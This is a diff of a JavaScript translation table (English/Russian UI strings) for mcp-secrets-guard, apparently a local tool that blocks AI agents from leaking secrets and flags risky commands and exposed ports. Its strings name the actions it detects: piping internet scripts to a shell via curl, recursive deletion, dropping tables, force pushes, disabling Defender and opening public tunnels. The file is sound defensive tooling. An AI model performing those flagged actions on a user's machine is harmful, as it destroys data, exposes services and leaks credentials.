-    "Protect & send, Block & quarantine, or Allow once": "«Защитить и отправить», «Заблокировать и поместить в карантин» или «Разрешить один раз»",
-    "Protect this secret": "Защитить этот секрет",
-    "Protected": "Защищено",
-    "Protected: ": "Защищено: ",
-    "Protected: #": "Под защитой: #",
-    "Publishes a container port on all interfaces": "Публикует порт контейнера на всех интерфейсах",
-    "Publishes local services on the internet.": "Публикует локальные сервисы в интернете.",
-    "Python API server (FastAPI, vLLM)": "API-сервер Python (FastAPI, vLLM)",
-    "Qdrant gRPC": "Qdrant gRPC",
-    "Qdrant vector database": "Векторная база данных Qdrant",
-    "Ray dashboard": "Панель управления Ray",
-    "Redis": "Redis",
-    "RemedyBody": "RemedyBody",
-    "Remote Desktop (RDP)": "Удалённый рабочий стол (RDP)",
-    "Remote Desktop is the most attacked service on the internet.": "Удалённый рабочий стол — самая атакуемая служба в интернете.",
-    "Remote Desktop to this PC will stop working.": "Удалённый рабочий стол на этот ПК перестанет работать.",
-    "Remote command execution on Windows.": "Удалённый запуск команд в Windows.",
-    "Remote control of this computer.": "Удалённое управление этим компьютером.",
-    "Remote shell; safe only with keys and no passwords.": "Удалённая оболочка; безопасна только с ключами и без паролей.",
-    "Remove Guard's block": "Снять блокировку Guard",
-    "Remove the block that Guard added? Windows will ask you to confirm.": "Убрать блокировку, которую добавил Guard? Windows попросит подтвердить.",
-    "Removed from trusted.": "Убрано из доверенных.",
-    "Rename": "Переименовать",
-    "Renamed.": "Переименовано.",
-    "Replace the secret with a vault token and let the action go through": "Заменить секрет токеном хранилища и пропустить действие",
-    "Replace value": "Заменить значение",
-    "Request refused: not from the Guard tab.": "Запрос отклонён: не со вкладки Guard.",
-    "Restore": "Восстановить",
-    "Restored.": "Восстановлено.",
-    "Run Jupyter with --ip=#.#.#.# and keep the token enabled.": "Запустите Jupyter с --ip=#.#.#.# и не отключайте токен.",
-    "Run Jupyter with --ip=127.0.0.1 and keep the token enabled.": "Запустите Jupyter с --ip=127.0.0.1 и не отключайте токен.",
-    "Runs a script straight from the internet": "Запускает скрипт прямо из интернета",
-    "SDK.fetchJSON(API +": "SDK.fetchJSON(API +",
-    "Safe": "Безопасно",
-    "Safer:": "Безопаснее:",
-    "Safer: ": "Безопаснее: ",
-    "Same data as Qdrant, via gRPC.": "Те же данные, что и Qdrant, через gRPC.",
-    "Save": "Сохранить",
-    "Save a copy to Downloads": "Сохранить копию в «Загрузки»",
-    "Saved a copy to Downloads.": "Копия сохранена в «Загрузки»:",
-    "Saved. Agents now get the token": "Сохранено. Теперь агенты получают токен",
-    "Saved. Agents now get the token ": "Сохранено. Теперь агенты получают токен ",
-    "Scanning ports… this takes about # seconds.": "Сканирование портов… это займет около # секунд.",
-    "Scanning ports… this takes about 10 seconds.": "Сканирование портов… это займет около 10 секунд.",
-    "Scanning…": "Сканирование…",
-    "Secret value assigned to a password/token field": "Секретное значение, присвоенное полю пароля/токена",
-    "SecretBody": "SecretBody",
-    "Sensitive data": "Конфиденциальные данные",
-    "Sensitive data ": "Конфиденциальные данные ",
-    "Sent with protection": "Отправлено с защитой",
-    "Set OLLAMA_HOST=#.#.#.# and restart Ollama.": "Задайте OLLAMA_HOST=#.#.#.# и перезапустите Ollama.",
-    "Set OLLAMA_HOST=#.#.#.#.": "Установите OLLAMA_HOST=#.#.#.#.",
-    "Set OLLAMA_HOST=127.0.0.1 and restart Ollama.": "Задайте OLLAMA_HOST=127.0.0.1 и перезапустите Ollama.",
-    "Set OLLAMA_HOST=127.0.0.1.": "Установите OLLAMA_HOST=127.0.0.1.",
-    "Set an unattended-access password or uninstall it.": "Задайте пароль для неконтролируемого доступа или удалите AnyDesk.",
-    "Set bind #.#.#.# and requirepass.": "Установите bind #.#.#.# и requirepass.",
-    "Set bind 127.0.0.1 and requirepass.": "Установите bind 127.0.0.1 и requirepass.",
-    "Set bind-address=#.#.#.# or block the port.": "Установите bind-address=#.#.#.# или заблокируйте порт.",
-    "Set bind-address=#.#.#.#.": "Установите bind-address=#.#.#.#.",
-    "Set bind-address=127.0.0.1 or block the port.": "Установите bind-address=127.0.0.1 или заблокируйте порт.",
-    "Set bind-address=127.0.0.1.": "Установите bind-address=127.0.0.1.",
-    "Set listen_addresses='localhost' or block the port.": "Установите listen_addresses='localhost' или заблокируйте порт.",
-    "Set listen_addresses='localhost'.": "Установите listen_addresses='localhost'.",
-    "Set net.bindIp: #.#.#.# and enable authorization.": "Установите net.bindIp: #.#.#.# и включите авторизацию.",
-    "Set net.bindIp: #.#.#.#.": "Установите net.bindIp: #.#.#.#.",
-    "Set net.bindIp: 127.0.0.1 and enable authorization.": "Установите net.bindIp: 127.0.0.1 и включите авторизацию.",
-    "Set net.bindIp: 127.0.0.1.": "Установите net.bindIp: 127.0.0.1.",
-    "Shares Windows updates with other PCs on your network.": "Делится обновлениями Windows с другими ПК в вашей сети.",
-    "Shares a folder over HTTP": "Открывает доступ к папке по HTTP",
-    "Show": "Показать",
-    "Show ": "Показать ",
-    "Show program file": "Показать файл программы",
-    "Slack token": "Токен Slack",
-    "Solana private key (base#)": "Приватный ключ Solana (base#)",
-    "Solana private key (base58)": "Приватный ключ Solana (base58)",
-    "Solana private key (keypair file)": "Приватный ключ Solana (файл keypair)",
-    "Some devices (TVs, media players) may not find this PC.": "Некоторые устройства (телевизоры, медиаплееры) могут не найти этот ПК.",
-    "Start it with --host #.#.#.# or add a login.": "Запустите с --host #.#.#.# или добавьте вход по паролю.",
-    "Start it with --host #.#.#.#.": "Запускайте с --host #.#.#.#.",
-    "Start it with --host 127.0.0.1 or add a login.": "Запустите с --host 127.0.0.1 или добавьте вход по паролю.",
-    "Start it with --host 127.0.0.1.": "Запускайте с --host 127.0.0.1.",
-    "Start with --host #.#.#.# or add an API key.": "Запустите с --host #.#.#.# или добавьте API-ключ.",
-    "Start with --host 127.0.0.1 or add an API key.": "Запустите с --host 127.0.0.1 или добавьте API-ключ.",
-    "Starts a server open to the whole network": "Запускает сервер, открытый для всей сети",
-    "Steam (Remote Play / LAN)": "Steam (удалённая игра / LAN)",
-    "Stop ngrok when you are not sharing, and protect the tunnel with a password.": "Останавливайте ngrok, когда не делитесь, и защитите туннель паролем.",
-    "Stop the program": "Остановить программу",
-    "Stop this program now? Unsaved work in it may be lost.": "Остановить эту программу сейчас? Несохранённая работа в ней может быть потеряна.",
-    "Stop trusting": "Перестать доверять",
-    "Stripe secret key": "Секретный ключ Stripe",
-    "System": "Система",
-    "System, all ports": "Система, все порты",
-    "TabBtn(": "TabBtn(",
-    "Take a backup first and confirm the exact table with the user.": "Сначала сделайте резервную копию и уточните у пользователя нужную таблицу.",
-    "TeamViewer remote access": "Удалённый доступ TeamViewer",
-    "Telegram bot token": "Токен бота Telegram",
-    "Telnet": "Telnet",
-    "TermService": "TermService",
-    "The action failed. Nothing was changed.": "Не удалось выполнить действие. Ничего не изменено.",
-    "The action stays blocked. The secret is kept encrypted in the vault.": "Действие остаётся заблокированным. Секрет хранится в зашифрованном виде в хранилище.",
-    "The analyzer could not be started. Check the Python path in config.json.": "Не удалось запустить анализатор. Проверьте путь к Python в config.json.",
-    "The analyzer returned an unreadable answer.": "Анализатор вернул нечитаемый ответ.",
-    "The analyzer returned nothing.": "Анализатор ничего не вернул.",
-    "The block was removed.": "Блокировка снята.",
-    "The data comes from": "Данные поступают из",
-    "The data comes from ": "Данные поступают из ",
-    "The exposure scan currently supports Windows only.": "Сканирование экспозиции в настоящее время поддерживает только Windows.",
-    "The exposure scan failed. Nothing was changed on this computer.": "Не удалось выполнить проверку открытости. На этом компьютере ничего не изменено.",
-    "The most attacked service on the internet (brute force, ransomware).": "Самый атакуемый сервис в интернете (перебор паролей, программы-вымогатели).",
-    "The program was stopped. It may start again later.": "Программа остановлена. Позже она может запуститься снова.",
-    "The program's file could not be found.": "Не удалось найти файл программы.",
-    "The service is off and will not start again.": "Служба отключена и больше не запустится.",
-    "The service will accept connections from any device on the network, and from the internet if the router forwards the port.": "Служба будет принимать подключения от любого устройства в сети, а также из интернета, если роутер пробрасывает порт.",
-    "The value is no longer in the vault.": "Этого значения больше нет в сейфе.",
-    "There is no secret to protect here. Choose Block or Allow once.": "Здесь нет секрета для защиты. Выберите «Заблокировать» или «Разрешить один раз».",
-    "This PC will stop offering UPnP devices to the network.": "Этот ПК перестанет предлагать устройства UPnP сети.",
-    "This change cannot be undone automatically.": "Это изменение нельзя отменить автоматически.",
-    "This code is too large (limit # KB).": "Код слишком большой (лимит # КБ).",
-    "This code is too large (limit 200 KB).": "Код слишком большой (лимит 200 КБ).",
-    "This file is too large (limit # MB).": "Файл слишком большой (лимит # МБ).",
-    "This file is too large (limit 10 MB).": "Файл слишком большой (лимит 10 МБ).",
-    "This incident has already been decided.": "По этому инциденту уже принято решение.",
-    "This is part of Windows and cannot be stopped from here.": "Это часть Windows, её нельзя остановить отсюда.",
-    "This permanently deletes a folder tree. Agents have wiped projects and home folders this way.": "Это безвозвратно удаляет папку со всем содержимым. Агенты таким способом стирали проекты и домашние папки.",
-    "This port is already reachable only from this computer.": "Этот порт уже доступен только с этого компьютера.",
-    "This program is no longer listening on that port. Run the check again.": "Эта программа больше не прослушивает этот порт. Запустите проверку снова.",
-    "This scan sees what listens on this computer and what Windows Firewall allows.": "Это сканирование показывает, что прослушивается на этом компьютере и что разрешает брандмауэр Windows.",
-    "This secret is too long (limit # KB).": "Секрет слишком длинный (лимит # КБ).",
-    "This secret is too long (limit 4 KB).": "Секрет слишком длинный (лимит 4 КБ).",
-    "This service cannot be switched off safely from here.": "Эту службу нельзя безопасно отключить отсюда.",
-    "This value was not stored in the vault, so it cannot be shown.": "Это значение не сохранено в сейфе, поэтому его нельзя показать.",
-    "Trash (": "Корзина (",
-    "Trash (#)": "Корзина (#)",
-    "Tunnels (ngrok, cloudflared, localtunnel, bore) publish a local service on the internet, bypassing the router and firewall.": "Туннели (ngrok, cloudflared, localtunnel, bore) публикуют локальный сервис в интернете в обход роутера и брандмауэра.",
-    "Turn off 'Serve on Local Network'.": "Выключите «Serve on Local Network».",
-    "Turn off Remote Desktop or use it only through a VPN.": "Отключите удалённый рабочий стол или используйте его только через VPN.",
-    "Turn off this Windows service? Windows will ask you to confirm. You can undo it here.": "Отключить эту службу Windows? Windows попросит подтвердить. Отменить это можно здесь.",
-    "Turn off this service": "Отключить эту службу",
-    "Turns off antivirus protection": "Отключает антивирусную защиту",
-    "Undo": "Отменить",
-    "Undone. Everything is back as it was.": "Отменено. Всё вернулось как было.",
-    "Unencrypted file transfer.": "Передача файлов без шифрования.",
-    "Unencrypted remote access.": "Удалённый доступ без шифрования.",
-    "Unknown action.": "Неизвестное действие.",
-    "Unknown choice.": "Неизвестный вариант.",
-    "Unknown entry.": "Неизвестная запись.",
-    "Unknown finding.": "Неизвестная находка.",
-    "Unknown operation.": "Неизвестная операция.",
-    "Unknown service": "Неизвестная служба",
-    "Unknown settings page.": "Неизвестная страница настроек.",
-    "Up to # MB: .env, keys, wallet files, documents.": "До # МБ: .env, ключи, файлы кошельков, документы.",
-    "Up to 10 MB: .env, keys, wallet files, documents.": "До 10 МБ: .env, ключи, файлы кошельков, документы.",
-    "Use --force-with-lease, or ask the user first.": "Используйте --force-with-lease или сначала спросите пользователя.",
-    "Use --host #.#.#.# (or bind to localhost) unless other devices really need it.": "Используйте --host #.#.#.# (или привязку к localhost), если только другим устройствам это действительно не нужно.",
-    "Use --host 127.0.0.1 (or bind to localhost) unless other devices really need it.": "Используйте --host 127.0.0.1 (или привязку к localhost), если только другим устройствам это действительно не нужно.",
-    "Use --ip=#.#.#.#.": "Используйте --ip=#.#.#.#.",
-    "Use --ip=127.0.0.1.": "Используйте --ip=127.0.0.1.",
-    "Use -p #.#.#.#:PORT:PORT.": "Используйте -p #.#.#.#:PORT:PORT.",
-    "Use -p 127.0.0.1:PORT:PORT.": "Используйте -p 127.0.0.1:PORT:PORT.",
-    "Use SFTP instead.": "Используйте вместо него SFTP.",
-    "Use a VPN instead of exposing Remote Desktop.": "Используйте VPN вместо открытия доступа к удалённому рабочему столу.",
-    "Use key-only login.": "Входите только по ключам.",
-    "Use only through a VPN or SSH tunnel.": "Используйте только через VPN или SSH-туннель.",
-    "Used to find devices and for normal app traffic. Not a server others can log into.": "Используется для поиска устройств и обычного трафика приложений. Это не сервер, к которому могут подключиться другие.",
-    "VNC remote desktop": "Удалённый рабочий стол VNC",
-    "Value replaced. Agents keep the same token.": "Значение заменено. Токен для агентов прежний.",
-    "Vault": "Сейф",
-    "VaultOpBody": "VaultOpBody",
-    "Vector databases hold your documents; Qdrant has no auth by default.": "Векторные базы данных хранят ваши документы; в Qdrant по умолчанию нет аутентификации.",
-    "Vendor update services listening on the network have had remote-code-execution bugs.": "Службы обновления вендоров, слушающие сеть, имели уязвимости удалённого выполнения кода.",
-    "Waiting for your decision": "Ожидает вашего решения",
-    "Web / AI server (llama.cpp, Open WebUI)": "Веб- или ИИ-сервер (llama.cpp, Open WebUI)",
-    "Web app (Next.js, Grafana, Open WebUI)": "Веб-приложение (Next.js, Grafana, Open WebUI)",
-    "Web app / Flask dev server": "Веб-приложение / dev-сервер Flask",
-    "What to do:": "Что делать:",
-    "WinRM": "WinRM",
-    "WinRM (PowerShell remoting)": "WinRM (удалённый PowerShell)",
-    "Windows Print Spooler": "Служба печати Windows",
-    "Windows Time (NTP)": "Служба времени Windows (NTP)",
-    "Windows Update delivery optimization": "Оптимизация доставки обновлений Windows",
-    "Windows did not finish the change in time. Nothing was confirmed.": "Windows не успела завершить изменение. Ничего не подтверждено.",
-    "Windows file sharing (SMB)": "Общий доступ к файлам Windows (SMB)",
-    "Windows keeps the clock in sync with time servers. It is not a server others can log into.": "Windows синхронизирует часы с серверами времени. Это не сервер, в который можно войти.",
-    "Windows refused the change. Nothing was changed.": "Windows отклонила изменение. Ничего не изменено.",
-    "Windows system service": "Системная служба Windows",
-    "mcp-secrets-guard": "mcp-secrets-guard",
-    "mcp-secrets-guard blocked an agent": "mcp-secrets-guard заблокировал агента",
-    "mcp-secrets-guard is not set up yet.": "mcp-secrets-guard ещё не настроен.",
-    "mcp-secrets-guard is not set up yet. Run the installer once, then reload Hermes.": "mcp-secrets-guard ещё не настроен. Запустите установщик один раз, затем перезагрузите Hermes.",
-    "You cancelled the Windows confirmation. Nothing was changed.": "Вы отменили подтверждение Windows. Ничего не изменено.",
-    "You marked this as trusted.": "Вы отметили это как доверенное.",
-    "Your embeddings are reachable.": "Ваши эмбеддинги доступны из сети.",
-    "Your local model and its prompts are reachable from the network.": "Ваша локальная модель и её запросы доступны из сети.",
-    "\\nexit #\\n": "\\nexit #\\n",
-    "\\nexit 0\\n": "\\nexit 0\\n",
+    "quarantined from an agent": "перехвачено у агента",
     "added by you": "добавлено вами",
-    "all incoming blocked": "все входящие заблокированы",
-    "allow once": "разрешить один раз",
-    "allowed once": "разрешено один раз",
-    "an agent": "агент",
-    "and (r.get(": "and (r.get(",
-    "and leaves through": "и покидают через",
-    "and never shown again here. Guard blocks any agent that tries to send it.": "и больше никогда не отображается здесь. mcp-secrets-guard блокирует любого агента, который попытается отправить его.",
-    "and store the secret encrypted": "и сохранить секрет в зашифрованном виде",
-    "bad request": "некорректный запрос",
-    "blocked before execution": "заблокировано до запуска",
-    "blocked in firewall": "заблокировано в брандмауэре",
-    "body: JSON.stringify(body),": "body: JSON.stringify(body),",
-    "busy ===": "busy ===",
-    "by default": "по умолчанию",
-    "check agent code before it runs": "проверять код агента перед запуском",
-    "critical ·": "критический ·",
-    "d ago": "дн назад",
-    "docker -p without an address publishes the port to every network and bypasses Windows Firewall in many setups.": "docker -p без адреса публикует порт во всех сетях и во многих конфигурациях обходит брандмауэр Windows.",
-    "file": "файл",
-    "Delete forever": "Удалить навсегда",
-    "Delete forever? This cannot be undone.": "Удалить навсегда? Это действие необратимо.",
-    "Move to trash": "Переместить в корзину",
-    "Move to trash? You can restore it later.": "Переместить в корзину? Позже вы сможете её восстановить.",
-    "Moved to the trash.": "Перемещено в корзину.",
-    "Deleted forever.": "Удалено навсегда.",
-    "Restored.": "Восстановлено.",
-    "Restore": "Восстановить",
-    "Rename": "Переименовать",
-    "Change kind": "Изменить категорию",
-    "New name": "Новое имя",
-    "New value": "Новое значение",
-    "Renamed.": "Переименовано.",
-    "Kind changed.": "Категория изменена.",
-    "Value replaced. Agents keep the same token.": "Значение заменено. У агентов остаётся тот же токен.",
-    "Replace value": "Заменить значение",
-    "Save a copy to Downloads": "Сохранить копию в «Загрузки»",
-    "Saved a copy to Downloads.": "Копия сохранена в «Загрузки».",
+    "Undo": "Отменить",
+    "undone": "отменено",
+    "Everything runs on this computer. Secret values are never shown or sent.": "Всё работает на этом компьютере. Секреты никогда не показываются и не отправляются.",
+    "No incidents yet.": "Инцидентов пока нет.",
+    "No incidents yet": "Инцидентов пока нет",
+    "Hold to show the full value": "Удерживайте, чтобы увидеть значение целиком",
+    "Could not show the value.": "Не удалось показать значение.",
+    "Unknown finding.": "Неизвестная находка.",
+    "This value was not stored in the vault, so it cannot be shown.": "Это значение не сохранено в сейфе, поэтому его нельзя показать.",
+    "The value is no longer in the vault.": "Этого значения больше нет в сейфе.",
+    "🔒 Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged.": "🔒 Всё работает на этом компьютере. Секреты замаскированы: полное значение видно, только пока вы удерживаете 👁, и каждый просмотр записывается в журнал.",
+    "Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged.": "Всё работает на этом компьютере. Секреты замаскированы: полное значение видно, только пока вы удерживаете 👁, и каждый просмотр записывается в журнал.",
+    "Safer: ": "Безопаснее: ",
+    "Safer: Use --host 127.0.0.1": "Безопаснее: Используйте --host 127.0.0.1",
+    "Use --host 127.0.0.1 (or bind to localhost) unless other devices really need it.": "Используйте --host 127.0.0.1 (или привязку к localhost), если другим устройствам действительно не нужен доступ.",
+    "Keep OLLAMA_HOST=127.0.0.1.": "Сохраняйте OLLAMA_HOST=127.0.0.1.",
+    "Use -p 127.0.0.1:PORT:PORT.": "Используйте -p 127.0.0.1:ПОРТ:ПОРТ.",
+    "Add --bind 127.0.0.1, and never run it in a folder with secrets.": "Добавьте --bind 127.0.0.1 и никогда не запускайте сервер в папке с секретами.",
+    "Only open a tunnel you started yourself, with a password, and close it after use.": "Открывайте только туннели, созданные вами лично, защищайте паролем и закрывайте после использования.",
+    "Ask the user first; open only the exact port for the exact program.": "Сначала спросите пользователя; открывайте только точный порт для конкретной программы.",
+    "Use a VPN instead of exposing Remote Desktop.": "Используйте VPN вместо открытия Remote Desktop в сеть.",
+    "Delete only an exact path the user named, and prefer moving to a trash folder.": "Удаляйте только указанный пользователем точный путь и отдавайте предпочтение перемещению в корзину.",
+    "Take a backup first and confirm the exact table with the user.": "Сначала сделайте резервную копию и уточните у пользователя точное имя таблицы.",
+    "Use --force-with-lease, or ask the user first.": "Используйте --force-with-lease или сначала спросите пользователя.",
+    "Download the script first, read it, then run it.": "Сначала скачайте скрипт, изучите его содержимое и только потом запускайте.",
+    "Do not let an agent change antivirus settings.": "Не позволяйте агенту изменять настройки антивируса.",
+    "If you turn it off: Other computers will no longer be able to access files and printers shared from this PC.": "Если отключить: Другие компьютеры больше не смогут получать доступ к общим файлам и принтерам на этом ПК.",
+    "If you turn it off: ASUS software will stop communicating with the router or motherboard utility.": "Если отключить: Программы ASUS перестанут связываться с утилитой материнской платы или роутера.",
+    "If you turn it off: ": "Если отключить: ",
+    "Starts a server open to the whole network": "Запускает сервер, открытый для всей сети",
+    "Exposes Ollama to the network": "Открывает доступ к Ollama из локальной сети",
+    "Publishes a container port on all interfaces": "Публикует порт контейнера на всех сетевых интерфейсах",
+    "Shares a folder over HTTP": "Открывает общий доступ к папке по HTTP",
+    "Opens a public internet tunnel": "Создаёт публичный интернет-туннель",
+    "Opens a port in the firewall or turns the firewall off": "Открывает порт в брандмауэре или отключает его",
+    "Enables Remote Desktop": "Включает удалённый рабочий стол (RDP)",
+    "Deletes files recursively": "Рекурсивно удаляет файлы и папки",
+    "Destroys database data": "Уничтожает данные в базе данных",
+    "Overwrites git history on the server": "Перезаписывает историю git на сервере (force push)",
+    "Runs a script straight from the internet": "Запускает скрипт напрямую из интернета (pipe to shell)",
+    "Turns off antivirus protection": "Отключает антивирусную защиту Windows Defender",
+    "The service will accept connections from any device on the network, and from the internet if the router forwards the port.": "Сервис будет принимать подключения с любого устройства в сети, а при пробросе портов — из интернета.",
+    "Anyone on the network could run, pull or delete your local AI models.": "Любой пользователь в сети сможет запускать, скачивать или удалять ваши локальные ИИ-модели.",
+    "docker -p without an address publishes the port to every network and bypasses Windows Firewall in many setups.": "docker -p без указания адреса публикует порт на всех интерфейсах и часто обходит брандмауэр Windows.",
+    "python -m http.server serves the whole folder to the network by default.": "python -m http.server по умолчанию открывает доступ ко всей текущей папке для всех устройств в сети.",
+    "Tunnels (ngrok, cloudflared, localtunnel, bore) publish a local service on the internet, bypassing the router and firewall.": "Туннели (ngrok, cloudflared, localtunnel) делают локальный сервис доступным из интернета в обход роутера и брандмауэра.",
+    "Changes what the internet can reach on this computer.": "Изменяет правила доступа из интернета к службам на этом компьютере.",
+    "Remote Desktop is the most attacked service on the internet.": "Удалённый рабочий стол — самый часто атакуемый сервис в сети.",
+    "This permanently deletes a folder tree. Agents have wiped projects and home folders this way.": "Это безвозвратно удаляет дерево каталогов. Агенты неоднократно стирали проекты таким способом.",
+    "DROP / TRUNCATE / DELETE without WHERE removes data permanently.": "DROP / TRUNCATE / DELETE без условия WHERE безвозвратно уничтожают таблицы.",
+    "A force push can erase other people's work and published history.": "Force push может стереть чужие коммиты и перезаписать историю репозитория.",
+    "Downloading and executing code in one step runs whatever the server sends, with your permissions.": "Скачивание и запуск кода в одну строчку выполняет любой присланный сервером код с вашими правами.",
+    "Disabling Defender removes protection against malware.": "Отключение Defender лишает систему защиты от вредоносных программ.",
+    "Safer:": "Безопаснее:",
+    "(via curl)": "(через curl)",
+    "Protect & send": "Защитить и отправить",
+    "Block & quarantine": "Заблокировать и изолировать",
+    "Allow once": "Разрешить один раз",
+    "⛔ Block": "⛔ Заблокировать",
+    "🛡 Protect & send": "🛡 Защитить и отправить",
+    "GitHub access token": "Токен доступа GitHub",
+    "terminal": "терминал",
+    "shell: curl": "команда: curl",
+    "shell: ollama": "команда: ollama",
+    "incident history": "история инцидентов",
+    "Check code": "Проверить код",
+    "Checking…": "Проверка…",
+    "Load example": "Пример скрипта",
+    "Open full report": "Полный отчёт",
+    "Close report": "Закрыть отчёт",
+    "Full report": "Полный отчёт",
+    "Credentials": "Учётные данные",
+    "Financial": "Финансовые данные",
+    "PII": "Персональные данные",
+    "Health": "Медицинские данные",
+    "Location": "Данные о геолокации",
+    "Password, API key or token": "Пароль, API-ключ или токен",
+    "Card or bank account": "Банковская карта или счёт",
+    "Personal data (name, phone, email)": "Персональные данные (ФИО, телефон, email)",
+    "Medical data": "Медицинские данные",
+    "Location data": "Геолокация и координаты",
     "Protect this secret": "Защитить этот секрет",
     "Encrypting…": "Шифрование…",
-    "Add a file": "Добавить файл",
-    "Up to 10 MB: .env, keys, wallet files, documents.": "До 10 МБ: .env, ключи, файлы кошельков, документы.",
-    "Protected: ": "Защищено: ",
-    "Credentials": "Учётные данные",
-    "Financial": "Финансовые",
-    "PII": "Личные данные",
-    "Health": "Здоровье",
-    "Location": "Местоположение",
-    "Password, API key or token": "Пароль, API-ключ или токен",
-    "Card or bank account": "Карта или банковский счёт",
-    "Personal data (name, phone, email)": "Персональные данные (имя, телефон, email)",
-    "Medical data": "Медицинские данные",
-    "Location data": "Данные о местоположении",
-    "firewall blocks it": "брандмауэр блокирует",
-    "firewall is OFF": "брандмауэр выключен",
-    "firewall lets it in": "брандмауэр пропускает",
-    "firewall: not verified": "брандмауэр: не проверено",
-    "from anyone": "от всех",
-    "from some addresses": "с некоторых адресов",
-    "from your local network only": "только из вашей локальной сети",
-    "group policy": "групповая политика",
-    "h ago": "ч назад",
-    "high ·": "высокий ·",
-    "if (data.status ===": "if (data.status ===",
-    "if (l.firewall_rule) t +=": "if (l.firewall_rule) t +=",
-    "if (r.status ===": "if (r.status ===",
-    "in #": "в #",
-    "in # lines": "в # строк",
-    "incident history": "история инцидентов",
-    "live protection": "защита в реальном времени",
-    "llama.cpp server (local AI model)": "Сервер llama.cpp (локальная ИИ-модель)",
-    "lm studio": "lm studio",
-    "local network": "локальная сеть",
-    "local subnet": "локальная подсеть",
-    "medium ·": "средний ·",
-    "method:": "method:",
-    "min ago": "мин назад",
-    "network exposure": "открытые порты",
-    "ngrok publishes a local service on the internet, bypassing your router and firewall.": "ngrok публикует локальный сервис в интернете, обходя ваш роутер и брандмауэр.",
-    "ngrok tunnel": "Туннель ngrok",
-    "no allowed protection: this data must not leave the program": "нет разрешенной защиты: эти данные не должны покидать программу",
-    "not base#": "не base#",
-    "not base58": "не base58",
-    "not needed": "не требуется",
-    "not verified": "не проверено",
-    "post(": "post(",
-    "program stopped": "программа остановлена",
-    "protected on line": "защищено в строке",
-    "protected secret": "защищённый секрет",
+    "Secret name (e.g. OpenAI Key, Visa Card)": "Название секрета (например: Ключ OpenAI, Карта Visa)",
+    "Paste the secret value": "Значение секрета (пароль, токен, ключ)",
+    "Check again": "Проверить снова",
+    "Scanning…": "Сканирование…",
     "port": "порт",
-    "public internet tunnel": "публичный интернет-туннель",
-    "python -m http.server serves the whole folder to the network by default.": "python -m http.server по умолчанию открывает всю папку для сети.",
-    "quarantined from an agent": "перехвачено у агента",
-    "quarantined:": "в карантине:",
-    "s ago": " с назад",
-    "safe listeners": "безопасные",
-    "sent with protection": "отправлено с защитой",
-    "service turned off": "служба отключена",
-    "session ": "сеанс ",
-    "setBusy(true); setReport(": "setBusy(true); setReport(",
-    "so it is only done when you ask for it.": "поэтому это выполняется только по вашему запросу.",
-    "some addresses": "некоторые адреса",
-    "tab ===": "tab ===",
-    "text": "текст",
-    "title:": "title:",
-    "to send data to": "чтобы отправить данные в",
-    "tried to use the tool": "попытался использовать инструмент",
-    "tried to:": "Пытался:",
-    "undone": "отменено",
-    "vault · your secrets, encrypted": "сейф · ваши секреты, зашифрованы",
-    "window.__HERMES_PLUGINS__.register(": "window.__HERMES_PLUGINS__.register(",
-    "works on first click": "работает с первого нажатия",
-    "· public internet tunnel": "· публичный интернет-туннель",
-    "· task": "· задача",
-    "… instead of the real value, and any attempt to send the real value is blocked.": "… вместо реального значения, и любая попытка отправить реальное значение блокируется.",
-    "⚠ needs manual review": "⚠ требует ручной проверки",
-    "⛔ Block": "⛔ Заблокировать",
-    "⛔ Block & quarantine": "⛔ Заблокировать и поместить в карантин",
-    "⛔ Leak on line": "⛔ Утечка в строке",
-    "⛔ Leak on line #": "⛔ Утечка в строке #",
-    "✓ No leaks found": "✓ Утечек не найдено",
-    "✓ Protected": "✓ Защищено",
-    "✓ verified: the fixed code passes the check": "✓ проверено: исправленный код проходит проверку",
-    "🔒 Everything runs on this computer. Secret values are never shown or sent.": "🔒 Всё выполняется на этом компьютере. Значения секретов никогда не отображаются и не отправляются.",
-    "🔒 Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged.": "🔒 Всё работает на этом компьютере. Секреты замаскированы: полное значение видно, только пока вы удерживаете 👁, и каждый просмотр записывается в журнал.",
-    "🛡 Protect & send": "🛡 Защитить и отправить"
-    };
+    "(pid": "(pid",
+    "What to do:": "Рекомендация:",
+    "Nothing risky is open to the network.": "Опасных портов в сети не обнаружено.",
+    "Open to every network": "Открыт для всей сети",
+    "Open to this local network": "Открыт для локальной сети",
+    "Only this computer": "Только для этого компьютера",
+    "Critical": "Критический",
+    "High": "Высокий",
+    "Medium": "Средний",
+    "Low": "Низкий",
+    "Safe": "Безопасный",
+    "mcp-secrets-guard blocked an agent": "mcp-secrets-guard заблокировал агента",
+    "mcp-secrets-guard": "mcp-secrets-guard"
+  };
   /* I18N_RU_END */
-  const LANG = (function () {
-    try { const l = (navigator.languages && navigator.languages[0]) || navigator.language || "";
-      return /^(ru|uk|be)\b/i.test(l) ? "ru" : "en"; } catch (e) { return "en"; }
-  })();
-  // Exact match first; then the same text with every number replaced by "#" (keys like
-  // "Exposure score #/100"), numbers are put back in order.
+
+  const I18N_EN = {
+    "Защита": "Protection",
+    "Порты": "Ports",
+    "Проверка кода": "Code Inspector",
+    "Сейф": "Vault",
+    "Настройки": "Settings",
+    "Ожидает решения": "Pending",
+    "Заблокировано": "Blocked, secret quarantined",
+    "Разрешено": "Allowed once",
+    "Защищено": "Protected & sent",
+    "Инцидентов пока нет.": "No incidents yet.",
+    "Все": "All",
+    "Удалить навсегда": "Delete forever",
+    "В корзину": "Move to trash",
+    "Восстановить": "Restore",
+    "Переименовать": "Rename",
+    "Сменить категорию": "Change kind",
+    "Заменить значение": "Replace value",
+    "Сохранить копию в «Загрузки»": "Save a copy to Downloads",
+    "Безопаснее: ": "Safer: ",
+    "Защитить и отправить": "Protect & send",
+    "Заблокировать и изолировать": "Block & quarantine",
+    "Разрешить один раз": "Allow once",
+    "⛔ Заблокировать": "⛔ Block",
+    "🛡 Защитить и отправить": "🛡 Protect & send",
+    "Проверить код": "Check code",
+    "Пример скрипта": "Load example",
+    "Полный отчёт": "Open full report",
+    "Закрыть отчёт": "Close report",
+    "Защитить этот секрет": "Protect this secret",
+    "Шифрование…": "Encrypting…",
+    "Проверить снова": "Check again",
+    "Сканирование…": "Scanning…",
+    "Очистить историю": "Clear history"
+  };
+
   function lookup(s) {
     if (Object.prototype.hasOwnProperty.call(I18N_RU, s)) return I18N_RU[s];
     const nums = s.match(/\d+/g);
     if (nums) {
       const k = s.replace(/\d+/g, "#");
